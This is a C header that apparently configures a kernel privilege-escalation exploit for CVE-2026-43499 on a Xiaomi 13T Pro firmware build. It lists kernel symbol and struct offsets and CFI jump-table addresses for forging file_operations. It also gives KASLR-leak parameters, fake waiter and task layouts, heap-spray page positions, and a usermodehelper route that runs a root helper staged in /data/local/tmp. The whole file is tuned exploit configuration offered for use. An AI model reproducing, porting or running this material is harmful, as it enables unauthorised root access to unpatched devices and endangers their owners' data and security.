#ifndef TARGET_H
#define TARGET_H

/* Xiaomi 13T Pro (corot_ru, 23078PND5G), MediaTek MT6985 / Dimensity 9200+
 *
 *   kernel 5.15.180-android13-8-00021-g46a5565a0982-ab13743836  (GKI, 4K pages)
 *   build  Xiaomi/corot_ru/corot:16/BP2A.250605.031.A3/
 *          OS3.0.301.0.WMLRUXM:user/release-keys
 *
 * The bug is unfixed in this image. remove_waiter() is out of line at image
 * offset 0x01770a90 and operates on `current` rather than on waiter->task --
 *
 *     mrs x20, SP_EL0            ; current, not waiter->task
 *     add x22, x20, #0x884       ; current->pi_lock
 *     str xzr, [x20, #0x8b0]     ; current->pi_blocked_on = NULL
 *
 * -- and rt_mutex_start_proxy_lock() (0x01772aa4) reaches it on its failure
 * path. That is the unfixed shape of CVE-2026-43499, and the same
 * disassembly re-confirms FAKE_TASK_PI_LOCK_OFF, FAKE_TASK_PI_WAITERS_OFF
 * and FAKE_TASK_PI_BLOCKED_ON_OFF below; task_blocks_on_rt_mutex's stores
 * re-confirm the waiter layout: task/lock at 0x30/0x38, prio at 0x44,
 * deadline at 0x48.
 *
 * This kernel has the compact rt_mutex_waiter -- one prio/deadline pair,
 * 0x58 bytes -- which is COMPACT_RT_MUTEX_WAITER below. The whole image is
 * byte-identical to the one Xiaomi ships as POCO air (air-AP3A.240905.015.A2);
 * the offsets here were cross-checked against a symbol-verified target for
 * that device, so an air target on this build can share them.
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "corot-OS3.0.301.0.WMLRUXM-app"
#else
#define BUILD_VARIANT_LABEL "corot-OS3.0.301.0.WMLRUXM-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "Xiaomi/corot_ru/corot:16/BP2A.250605.031.A3/" \
  "OS3.0.301.0.WMLRUXM:user/release-keys"
#endif

/* --------------------------------------------------------- generated ---
 * Everything between these markers is the output of the port's own
 * extractor, run against this build's boot.img. Regenerate it rather than
 * editing a number inside it.
 */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET 0x8000000ULL
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x8000000ULL
#endif

#define COMPACT_RT_MUTEX_WAITER 1
#define PHYS_P0_ORACLE 1

#define INIT_TASK_OFF 0x02c43640ULL
#define ROOT_TASK_GROUP_OFF 0x02d57ac0ULL
#define KMALLOC_CACHES_OFF 0x02164a60ULL
#define ANON_PIPE_BUF_OPS_OFF 0x01f85130ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x0016e824ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x02b007d8ULL
#define SELINUX_ENFORCING_OFF 0x02da9d78ULL

#define ASHMEM_FOPS_OFF 0x021027c8ULL
#define ASHMEM_MISC_FOPS_OFF 0x02c91d40ULL
#define ASHMEM_IOCTL_OFF 0x0113dc10ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x0113e2c0ULL
#define ASHMEM_MMAP_OFF 0x0113e320ULL
#define ASHMEM_OPEN_OFF 0x0113e610ULL
#define ASHMEM_RELEASE_OFF 0x0113e6b0ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x0113e7d4ULL
#define CONFIGFS_READ_ITER_OFF 0x00676230ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00676d54ULL
#define COPY_SPLICE_READ_OFF 0x005c3ba4ULL
#define NOOP_LLSEEK_OFF 0x0055126cULL

/* This image has Clang full CFI with per-type jump tables: function pointers
 * stored in kernel file_operations tables are the corresponding .cfi_jt
 * thunk addresses (8-byte "bti c; b func" entries), and every indirect call
 * site range-checks the target against its type sub-table. Pointing a forged
 * table at the direct function bodies reaches __cfi_check_fail -> panic.
 * Each thunk below was verified to branch to the function it stands for. */
#define KERNEL_CFI_JT 1
#define ASHMEM_IOCTL_CFI_JT_OFF 0x0175e510ULL
#define ASHMEM_COMPAT_IOCTL_CFI_JT_OFF 0x0175e518ULL
#define ASHMEM_MMAP_CFI_JT_OFF 0x01747830ULL
#define ASHMEM_OPEN_CFI_JT_OFF 0x01757670ULL
#define ASHMEM_RELEASE_CFI_JT_OFF 0x01757678ULL
#define ASHMEM_SHOW_FDINFO_CFI_JT_OFF 0x017479c0ULL
#define CONFIGFS_READ_ITER_CFI_JT_OFF 0x017475d0ULL
#define CONFIGFS_BIN_WRITE_ITER_CFI_JT_OFF 0x017475e8ULL
#define COPY_SPLICE_READ_CFI_JT_OFF 0x01747930ULL
#define NOOP_LLSEEK_CFI_JT_OFF 0x01744ae0ULL
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF 0x01765470ULL

#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_PRIO_OFF 0x44
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_WW_CTX_OFF 0x50
#define FAKE_WAITER_LAYOUT_SIZE 0x58

#define FAKE_TASK_USAGE_OFF 0x38
#define FAKE_TASK_PRIO_OFF 0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
#define FAKE_TASK_TASK_GROUP_OFF 0x400
#define FAKE_TASK_PI_LOCK_OFF 0x884
#define FAKE_TASK_PI_WAITERS_OFF 0x898
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8a8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0
#define CFG_PAGE_OFF 0x10
#define CFG_NEEDS_READ_FILL_OFF 0x50
#define CFG_BIN_BUFFER_OFF 0x58
#define CFG_BIN_BUFFER_SIZE_OFF 0x60
#define CFG_CB_MAX_SIZE_OFF 0x64
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30
#define STRUCT_PAGE_SIZE 0x40

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0
/* ----------------------------------------------------- end generated ---
 *
 * P0_PHYS_OFFSET is the MediaTek DRAM base rather than the 0x40000000 the
 * kernel's own PHYS_OFFSET prints -- carried from this device's previous
 * build, where it was measured, and not yet re-exercised here: both hardware
 * runs so far took the tracefs slide. P0_KERNEL_PHYS_LOAD is set equal to
 * it, i.e. delta zero, which is what every MediaTek target in this
 * repository measured (MT6991, MT6993, MT6897); only the delta reaches the
 * payload, through P0_DATA_ALIAS_CONST(). The #ifndef on each is so a device
 * that disagrees can be answered with -DP0_...=0x... rather than an edit
 * here.
 *
 * A static P0_PHYS_OFFSET is sound on this configuration for the same reason
 * as on the other MediaTek targets: the 1 GiB shift arm64_memblock_init()
 * can apply from memstart_offset_seed is guarded by `linear_region_size -
 * BIT(parange) >= ARM64_MEMSTART_ALIGN`, which is negative at VA_BITS=39.
 */

#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* The mm_struct slab's object stride: the cache is created with
 * SLAB_HWCACHE_ALIGN over sizeof(struct mm_struct) = 0x3e0, so 0x400 either
 * way, and an order-3 slab holds 32 of them. */
#define MM_STRUCT_SZ 0x400
#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3

/* The KASLR leak the shell route reads: sched_blocked_reason (tracefs event
 * 108) caller fields, resolved against three static anchors in this image.
 * The worker and vfork callers were exercised on hardware; the schedule
 * caller is the one PAC-ret boots report for many tasks when the signed PCs
 * break __get_wchan's range compare. */
#define SLIDE_TRACEFS_EVENT_ID 108
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00178510ULL
#define SLIDE_TRACEFS_VFORK_CALLER_OFF 0x001313b4ULL
#define SLIDE_TRACEFS_SCHED_CALLER_OFF 0x01768b04ULL
#define SLIDE_TRACEFS_CALLER_SITES_HEADER \
  "targets/corot/ru/5.15.180-android13-8-00021-g46a5565a0982-ab13743836/tracefs_sites.h"

/* The P0 oracle -- the slide source an application falls back to when
 * tracefs answers EACCES. The fingerprint that scores the physical
 * candidates was generated offline from this build's image. */
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_MIN_SCORE 6
#define P0_FINGERPRINT_HEADER \
  "targets/corot/ru/5.15.180-android13-8-00021-g46a5565a0982-ab13743836/p0_fingerprint.h"

#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32
#define SLIDE_KASLR_STEP 0x4000ULL

/* The virtual base on this kernel is randomized independently of the image's
 * physical placement: lk relocates the RELR image to an arbitrary 64K-
 * aligned virtual base (observed slides 0x12d4600000 through 0x2984400000,
 * 2 MiB-aligned in practice) while the physical placement stays within the
 * 2 MiB the fingerprint scans. So the fingerprint's physical answer cannot
 * stand in for the slide -- after it places the image, the virtual-base
 * oracle reads the live misc->fops word off the probe page and derives the
 * true base, and everything afterwards addresses data symbols through the
 * physical alias while text keeps the slid virtual addresses.
 *
 * The window is measured, not derived: the image's link address already sits
 * ~171 GiB below the top of VA39, so the reachable bases run from there up
 * to vmemmap, which the image cannot overlap. Two oracle runs landed at
 * KIMAGE+0x2403000000 and KIMAGE+0x2479200000 (~155 GiB) -- both inside it,
 * both first rejects of a window that had been miscomputed as 16 GiB wide. */
#define PHYS_VIRTUAL_BASE_ORACLE 1
#define KIMAGE_VIRTUAL_BASE_MIN 0xffffffc008000000ULL
#define KIMAGE_VIRTUAL_BASE_MAX 0xfffffffe00000000ULL
#define SLIDE_VIRTUAL_BASE_DELAY_USEC 50000

/* Clean-miss budget for the oracle rounds above. The slot-0 pipe reclaim is
 * the one step of the chain that loses a race all by itself (one clean miss
 * in three boots so far, shell and app alike); a miss leaves nothing to
 * restore -- no pipe page changed -- and a redo costs one prepare cycle
 * (~20-40 s) inside the same attempt. The verified oracle-route run already
 * proved the identical reset/re-prepare/reclaim sequence sound by running it
 * between its fingerprint and virtual-probe rounds. The fops production
 * stage stays single-shot: its clean-miss behavior is unmeasured on this
 * target, and a dirty miss there is core510's wedged misc_fops, not a
 * retry. */
#define SLIDE_ORACLE_ROUND_ATTEMPTS 3

/* The stack-copy route that stamps the dangling waiter: an IPv6 multicast
 * socket option's 0x108-byte in-kernel copy, landing the forged waiter at
 * stack offset 0x60 over the freed rt_mutex_waiter. */
#define SLIDE_ROUTE SLIDE_ROUTE_MCAST
#define MCAST_WAITER_OFF 0x60
#define PRODUCTION_STACK_PI_RIGHT_ONLY 1

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_REQUEUE_ARM_USEC 20000
#define SLIDE_WAIT_NSEC 2000000000L
#define SLIDE_USE_FAKE_TASK 1
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL

#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define FOPS_ROUTE_COARSE_DELAY_USEC 50000
#define FOPS_ROUTE_FINE_DELAY_TICKS \
  0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL

#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8

#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40

#define SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 64
#define SLIDE_RECLAIM_SENDS 64

/* Boot-id slide-leak symbols. Only read by the non-p0 slide route, which
 * PHYS_P0_ORACLE=1 compiles out -- values from the symbol-verified air
 * target for this same kernel binary. */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x02b01e28ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02b01e28ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02dc5a19ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02dc5819ULL

/* ------------------------------------------------------------- derived ---
 * Image addresses the core spells as one name: KIMAGE_TEXT_BASE plus the
 * offset above.
 */
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)

#define ASHMEM_IOCTL_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_CFI_JT_OFF)
#define ASHMEM_COMPAT_IOCTL_CFI_JT \
  (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_CFI_JT_OFF)
#define ASHMEM_MMAP_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_MMAP_CFI_JT_OFF)
#define ASHMEM_OPEN_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_OPEN_CFI_JT_OFF)
#define ASHMEM_RELEASE_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_CFI_JT_OFF)
#define ASHMEM_SHOW_FDINFO_CFI_JT \
  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_CFI_JT_OFF)
#define CONFIGFS_READ_ITER_CFI_JT \
  (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_CFI_JT_OFF)
#define CONFIGFS_BIN_WRITE_ITER_CFI_JT \
  (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_CFI_JT_OFF)
#define COPY_SPLICE_READ_CFI_JT \
  (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_CFI_JT_OFF)
#define NOOP_LLSEEK_CFI_JT (KIMAGE_TEXT_BASE + NOOP_LLSEEK_CFI_JT_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF)

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Where each faked object sits inside the reclaimed order-3 page. Layout of
 * the payload the exploit sprays, not of anything in the kernel. */
#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* ------------------------------------------------------- deployment ---
 * Not about the kernel: where the bring-up run stages the bootstrap helper,
 * where in the reclaimed page the usermodehelper work item is built, and the
 * supervisor budget. The timeout is the one the reference tree ran with --
 * the kernelsnitch sweep alone can run to tens of minutes -- and killing an
 * attempt midway is not free, so it is sized to what a healthy attempt took
 * rather than to what a fast one takes.
 */
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#define PAYLOAD_ATTEMPT_BUDGET 1
#define PAYLOAD_ATTEMPT_TIMEOUT_SEC 2200

/* The success epilogue hands the still-open forged references (the configfs
 * file, the physrw pipe pair) to the resident root helper instead of leaving
 * them with a keeper forked in the caller's domain. Measured the hard way:
 * the keeper is an app-domain process on the application route, Android
 * reaps it within hours of the app going away, and its death closes the
 * configfs file -- whose release frees a forged object -- and the pipe pair,
 * after which the pages they pinned go back to the allocator while the kernel
 * still references them. A reboot follows within hours. A helper that does
 * not answer the opcode leaves the keeper fallback in place, so this is an
 * opt-in per target, not a change to the core's default. */
#define STABILITY_TRANSFER_TO_ROOT 1

#endif
